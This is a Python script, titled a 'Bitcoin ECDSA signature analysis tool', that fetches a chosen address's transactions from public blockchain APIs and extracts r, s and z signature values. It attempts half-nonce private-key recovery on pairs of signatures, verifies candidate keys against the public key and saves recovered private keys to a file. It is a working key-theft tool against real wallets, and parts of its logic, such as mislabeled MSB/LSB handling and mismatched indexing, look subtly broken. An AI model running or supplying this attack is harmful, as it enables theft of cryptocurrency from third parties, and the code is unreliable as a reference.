#!/usr/bin/env python
import sys
import hashlib
import json
import argparse
from urllib.request import urlopen
import gmpy2
import bitcoinlib
from fastecdsa.ecdsa import verify
from fastecdsa.point import Point
from fastecdsa.curve import secp256k1
from concurrent.futures import ProcessPoolExecutor, as_completed

# Константы
signs = [(-1, -1), (-1, 1), (1, -1), (1, 1)]
mask_msb = (1 << 256) - 1
mask_lsb = (1 << 128) - 1

# Функции из half_parallel_attack.py
def compute_k(d, r, s, h):
    k = (gmpy2.invert(s, secp256k1.q) * (h + r*d)) % secp256k1.q
    return k

def recover_key_lsb(h, s, r):
    s_inv = [gmpy2.invert(s_i, secp256k1.q) for s_i in s]
    
    h1_msb = h[0] >> 128
    h2_msb = h[1] >> 128
    
    try:
        a_inv = gmpy2.invert(r[0]*s_inv[0] - r[1]*s_inv[1], secp256k1.q)
    except ZeroDivisionError:
        return None
    
    b = h[0]*s_inv[0] - h[1]*s_inv[1]
    for sign in signs:
        c = (sign[0] * h1_msb - sign[1] * h2_msb) << 128
        d = ((c-b) * a_inv) % secp256k1.q
        k = (sign[0] * s_inv[0] * (h[0] + r[0]*d)) % secp256k1.q
        if k >> 128 == h1_msb:
            print(f"Found potential private key (LSB): {hex(d)}")
            print(f"Nonce k: {hex(k)}")
            print(f"h1_msb: {hex(h1_msb)}")
            return d
    return None

def recover_key_msb(h, s, r):
    s_inv = [gmpy2.invert(s_i, secp256k1.q) for s_i in s]
    h1_lsb = h[0] >> 128
    h2_lsb = h[1] >> 128

    try:
        a_inv = gmpy2.invert(r[0]*s_inv[0] - r[1]*s_inv[1], secp256k1.q)
    except ZeroDivisionError:
        return None
    
    b = h[0]*s_inv[0] - h[1]*s_inv[1]
    for sign in signs:
        c = (sign[0] * h1_lsb - sign[1] * h2_lsb)
        d = ((c-b) * a_inv) % secp256k1.q
        k = (sign[0] * s_inv[0] * (h[0] + r[0]*d)) % secp256k1.q
        if k & mask_lsb == h1_lsb:
            print(f"Found potential private key (MSB): {hex(d)}")
            print(f"Nonce k: {hex(k)}")
            print(f"h1_lsb: {hex(h1_lsb)}")
            return d
    return None

# Функции из rsz_rdiff_scan.py для извлечения r, s, z
def get_rs(sig):
    try:
        rlen = int(sig[2:4], 16)
        r = sig[4:4+rlen*2]
        s = sig[8+rlen*2:]
        return r, s
    except:
        return None, None

def split_sig_pieces(script):
    try:
        if len(script) < 4:
            return None, None, None
            
        sigLen = int(script[2:4], 16)
        if len(script) < 2+sigLen*2:
            return None, None, None
            
        sig = script[2+2:2+sigLen*2]
        r, s = get_rs(sig[4:])
        if r is None:
            return None, None, None
            
        pubLen_pos = 4+sigLen*2
        if len(script) < pubLen_pos+2:
            return None, None, None
            
        pubLen = int(script[pubLen_pos:pubLen_pos+2], 16)
        pub_pos = pubLen_pos+2
        if len(script) < pub_pos+pubLen*2:
            return None, None, None
            
        pub = script[pub_pos:]
        if len(pub) != pubLen*2:
            return None, None, None
            
        return r, s, pub
    except:
        return None, None, None

def parseTx(txn):
    if len(txn) < 130:
        print('[WARNING] rawtx most likely incorrect. Please check..')
        return None
    
    inp_list = []
    ver = txn[:8]
    if txn[8:12] == '0001':
        print('UnSupported Tx Input. Presence of Witness Data')
        return None
    
    try:
        inp_nu = int(txn[8:10], 16)
    except:
        print('Invalid input count in transaction')
        return None
        
    first = txn[0:10]
    cur = 10
    
    for m in range(inp_nu):
        if len(txn) < cur+64+8:
            print('Transaction too short at input', m)
            return None
            
        prv_out = txn[cur:cur+64]
        var0 = txn[cur+64:cur+64+8]
        cur = cur+64+8
        
        if len(txn) < cur+2:
            print('Transaction too short at script length', m)
            return None
            
        try:
            scriptLen = int(txn[cur:cur+2], 16)
        except:
            print('Invalid script length at input', m)
            return None
            
        script_end = 2+cur+2*scriptLen
        if len(txn) < script_end:
            print('Transaction too short at script', m)
            return None
            
        script = txn[cur:script_end]
        r, s, pub = split_sig_pieces(script)
        if r is None:
            print('Failed to parse script at input', m)
            return None
            
        seq_end = 10+cur+2*scriptLen
        if len(txn) < seq_end:
            print('Transaction too short at sequence', m)
            return None
            
        seq = txn[2+cur+2*scriptLen:seq_end]
        inp_list.append([prv_out, var0, r, s, pub, seq])
        cur = seq_end
    
    rest = txn[cur:]
    return [first, inp_list, rest]

def get_rawtx_from_blockchain(txid):
    try:
        htmlfile = urlopen(f"https://blockchain.info/rawtx/{txid}?format=hex", timeout=20)
        return htmlfile.read().decode('utf-8')
    except Exception as e:
        print(f'Error fetching raw transaction {txid}: {e}')
        return None

def getSignableTxn(parsed):
    if parsed is None:
        return []
        
    res = []
    first, inp_list, rest = parsed
    tot = len(inp_list)
    
    for one in range(tot):
        e = first
        for i in range(tot):
            e += inp_list[i][0]  # prev_txid
            e += inp_list[i][1]  # var0
            if one == i:
                e += '1976a914' + HASH160(inp_list[one][4]) + '88ac'
            else:
                e += '00'
            e += inp_list[i][5]  # seq
        e += rest + "01000000"
        z = hashlib.sha256(hashlib.sha256(bytes.fromhex(e)).digest()).hexdigest()
        res.append([inp_list[one][2], inp_list[one][3], z, inp_list[one][4], e])
    return res

def HASH160(pubk_hex):
    return hashlib.new('ripemd160', hashlib.sha256(bytes.fromhex(pubk_hex)).digest()).hexdigest()

def check_tx(address):
    try:
        htmlfile = urlopen(f"https://mempool.space/api/address/{address}/txs", timeout=20)
        res = json.loads(htmlfile.read())
        txid = []
        cdx = []
        
        for tx in res:
            for vin in tx["vin"]:
                if vin.get("prevout", {}).get("scriptpubkey_address") == address:
                    txid.append(tx["txid"])
                    cdx.append(tx["vin"].index(vin))
        
        print(f'Found {len(txid)} transactions for address: {address}')
        return txid, cdx
    except Exception as e:
        print(f'Error fetching transactions: {e}')
        return [], []

def write_rsz_to_file(txid, r, s, z, pubkey, filename="R_S_Z.txt"):
    with open(filename, 'a') as f:
        f.write(f"TXID: {txid}\n")
        f.write(f"R: {r}\n")
        f.write(f"S: {s}\n")
        f.write(f"Z: {z}\n")
        f.write(f"PubKey: {pubkey}\n")
        f.write("-"*70 + "\n")

def process_transactions(address, output_file):
    txid, cdx = check_tx(address)
    if not txid:
        print("No transactions found for the address")
        return
    
    r_list, s_list, z_list, pubkey_list = [], [], [], []
    
    # Очистим файл перед записью новых данных
    open("R_S_Z.txt", 'w').close()
    
    for c in range(len(txid)):
        print(f"\nProcessing transaction {c+1}/{len(txid)}: {txid[c]}")
        rawtx = get_rawtx_from_blockchain(txid[c])
        if not rawtx:
            print("Failed to fetch raw transaction")
            continue
            
        parsed = parseTx(rawtx)
        if not parsed:
            print("Failed to parse transaction")
            continue
            
        signed = getSignableTxn(parsed)
        if not signed:
            print("No valid signatures found in transaction")
            continue
            
        for i in range(len(signed)):
            if i == cdx[c]:
                r_hex = signed[i][0]
                s_hex = signed[i][1]
                z_hex = signed[i][2]
                pubkey = signed[i][3]
                
                try:
                    r_int = int(r_hex, 16)
                    s_int = int(s_hex, 16)
                    z_int = int(z_hex, 16)
                    
                    r_list.append(r_int)
                    s_list.append(s_int)
                    z_list.append(z_int)
                    pubkey_list.append(pubkey)
                    
                    # Записываем r, s, z в файл
                    write_rsz_to_file(txid[c], r_hex, s_hex, z_hex, pubkey)
                    
                    print('='*70)
                    print(f'Transaction: {txid[c]}')
                    print(f'R: {r_hex}')
                    print(f'S: {s_hex}')
                    print(f'Z: {z_hex}')
                    print(f'PubKey: {pubkey}')
                except ValueError as e:
                    print(f"Invalid signature values in transaction: {e}")
    
    if len(r_list) < 2:
        print("\nNeed at least 2 valid signatures to attempt key recovery")
        return
    
    print("\nAttempting key recovery...")
    # Попробуем восстановить ключ
    for i in range(len(r_list) - 1):
        h = [z_list[i], z_list[i+1]]
        s = [s_list[i], s_list[i+1]]
        r = [r_list[i], r_list[i+1]]
        
        print('='*70)
        print(f"Attempting key recovery with signatures {i} and {i+1}")
        
        # Попробуем LSB атаку
        priv_key = recover_key_lsb(h, s, r)
        if priv_key is not None:
            print(f"Potential private key found (LSB): {hex(priv_key)}")
            # Проверим ключ
            try:
                pubkey = bitcoinlib.keys.Key(pubkey_list[i], is_private=False)
                x = pubkey.public_point().x
                y = pubkey.public_point().y
                Q = Point(x, y, curve=secp256k1)
                
                if int(priv_key) * secp256k1.G == Q:
                    print("!!! SUCCESS: Private key verified !!!")
                    with open(output_file, 'a') as f:
                        f.write(f"{pubkey_list[i]},{hex(priv_key)},{txid[i]}\n")
                else:
                    print("Key verification failed")
            except Exception as e:
                print(f"Error verifying key: {e}")
        
        # Попробуем MSB атаку
        priv_key = recover_key_msb(h, s, r)
        if priv_key is not None:
            print(f"Potential private key found (MSB): {hex(priv_key)}")
            # Проверим ключ
            try:
                pubkey = bitcoinlib.keys.Key(pubkey_list[i], is_private=False)
                x = pubkey.public_point().x
                y = pubkey.public_point().y
                Q = Point(x, y, curve=secp256k1)
                
                if int(priv_key) * secp256k1.G == Q:
                    print("!!! SUCCESS: Private key verified !!!")
                    with open(output_file, 'a') as f:
                        f.write(f"{pubkey_list[i]},{hex(priv_key)},{txid[i]}\n")
                else:
                    print("Key verification failed")
            except Exception as e:
                print(f"Error verifying key: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Bitcoin ECDSA signature analysis tool')
    parser.add_argument('-a', '--address', type=str, required=True, help='Bitcoin address to analyze')
    parser.add_argument('-o', '--output', type=str, default='results.txt', help='Output file for results')
    
    args = parser.parse_args()
    
    print(f"\nStarting analysis for address: {args.address}")
    print(f"Results will be saved to: {args.output}")
    print(f"All R, S, Z values will be saved to: R_S_Z.txt")
    
    process_transactions(args.address, args.output)
    print("\nAnalysis complete")